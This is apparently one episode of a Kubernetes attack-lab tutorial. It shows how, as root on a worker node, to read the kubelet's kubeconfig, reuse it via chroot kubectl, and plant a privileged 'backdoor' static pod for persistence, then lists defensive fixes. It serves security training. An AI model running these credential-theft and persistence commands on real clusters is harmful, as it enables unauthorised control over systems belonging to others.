# Episode 4 – Node Domination

In Episode 3, we escaped the container and gained root access to the Node. Now, we ask: **"What can I do with this power?"**

In this episode, we assume:
> You have achieved **Code Execution on the Node** (via Container Escape, SSH, or RCE).
> You are `root` on the worker node.

Our goal here is to:
- **Steal the Kubelet's Credentials**: Access the `kubeconfig` used by the Kubelet service.
- **Control the Node**: Use these credentials to talk to the API as the Node.
- **Establish Persistence**: Create a cron job on the host to ensure we stay in control even if the pod is deleted.

## 1. Setup the Lab

We deploy a pod that simulates our "foothold" on the node (Privileged + HostPath mounted).

From the root of this repo:

```bash
kubectl apply -f episodes/ep4-node-domination/manifests/
```

## 2. Enter the Attacker Pod

```bash
kubectl -n battleground exec -it deploy/node-attacker -- bash
```

## 3. The Attack: Looting the Node

Since we mounted the host's root filesystem at `/host`, we don't even need `nsenter` to read files. We can just browse `/host/...`.

### 3.1. Stealing Kubelet Credentials

The Kubelet needs to talk to the API Server. It usually keeps its `kubeconfig` in `/etc/kubernetes/`.

```bash
ls -l /host/etc/kubernetes/
```

You should see `kubelet.conf` or similar. Let's try to use it!

```bash
# Point kubectl to the stolen config
export KUBECONFIG=/host/etc/kubernetes/kubelet.conf

# Where is kubectl?
# If it's not in the pod, we can use the one ON THE HOST via chroot!
chroot /host kubectl get nodes
```

**Impact:**
The Kubelet's credentials allow it to:
- Read all Secret/ConfigMap objects mounted to pods on this node.
- Update its own Node status.
- (In some misconfigured clusters) Read all secrets in the cluster.

### 3.2. Persistence via Static Pods

Since `cron` and `sshd` might not be installed on minimal container-optimized OS nodes (like Kind nodes), a more reliable and **Kubernetes-native** persistence method is creating a **Static Pod**.

The Kubelet automatically watches the `/etc/kubernetes/manifests/` directory. If we drop a pod manifest there, the Kubelet will start it and keep it running (even if the API server is down!).

```bash
# Create a malicious static pod manifest
cat <<EOF > /host/etc/kubernetes/manifests/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-pod
  namespace: kube-system
spec:
  hostPID: true
  containers:
  - name: backdoor
    image: ubuntu:latest
    command: ["/bin/sleep", "3600"]
    securityContext:
      privileged: true
EOF
```

**Why is this dangerous?**
- This pod is managed by the Kubelet, not the API Server (mostly).
- It will automatically restart if killed.
- It survives cluster reboots.

### 3.3. Check the Persistence

Wait a few seconds, then check if the pod appeared in the cluster:

```bash
# Use the stolen credentials to check
export KUBECONFIG=/host/etc/kubernetes/kubelet.conf
chroot /host kubectl get pods -n kube-system | grep backdoor
```

**Output:** `backdoor-pod-battleground-control-plane   1/1     Running ...`

## 4. Fix

- **Restrict HostPath:** Use Policy (PSS/OPA) to block `hostPath` mounts, especially for `/`, `/etc`, and `/var`.
- **Rotate Credentials:** If a node is compromised, rotate the Kubelet certificates immediately.
- **Node Isolation:** Ensure Kubelet credentials only have permissions for *that specific node* (NodeAuthorizer).
- **File Integrity Monitoring (FIM):** Monitor `/etc/kubernetes` and `/etc/cron.d` for unauthorized changes.
